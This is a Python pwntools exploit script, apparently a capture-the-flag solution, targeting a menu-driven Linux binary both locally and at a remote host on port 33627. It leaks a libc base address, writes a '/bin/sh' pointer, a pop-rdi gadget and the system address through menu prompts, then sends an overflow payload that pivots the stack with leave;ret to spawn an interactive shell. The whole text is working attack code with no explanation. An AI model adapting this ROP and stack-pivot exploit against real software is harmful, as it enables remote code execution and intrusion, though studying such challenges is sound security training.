#!usr/bin/env python
#coding=utf-8
from pwn import *
from ctypes import CDLL
context(arch = 'amd64',os = 'linux',log_level = 'debug')
elf = ELF('./pwn')
DEBUG = 1
if DEBUG:
    gdbOpen = 1
    clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF("./libc.so.6")
    p = process('./pwn_patched')
else:
    gdbOpen = 0
    ip = 'node2.yuzhian.com.cn'
    port = 33627
    libc = ELF("./libc.so.6")
    p = remote(ip, port)
    clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

def debug(info="b main"):
    if gdbOpen == 1:
        gdb.attach(p, info)
    #gdb.attach(p, "b *$rebase(0x)")

def choose(choice):
    p.sendlineafter(b"> \n", str(choice).encode('ascii'))

pop_rdi = 0x0000000000401573
leave_ret = 0x000000000040139E
debug("b *0x000000000040139F")
choose(4)
p.recvuntil(b'0x')
leak = int(p.recv(12), 16) - 0x84420
log.info("libc_base==>0x%x" %leak)
sys = leak + libc.sym['system']
binsh = leak + next(libc.search(b'/bin/sh'))
choose(1)
p.sendafter(b'comment?\n', p64(binsh))
choose(2)
p.sendafter(b'corment?\n', p64(pop_rdi))
choose(3)
p.sendafter(b'corMenT?\n', p64(sys))
choose(4)
payload = b'a'*0xa + p64(0x0000000000405098) + p64(leave_ret)
p.sendafter(b'heart...\n', payload)

p.interactive()
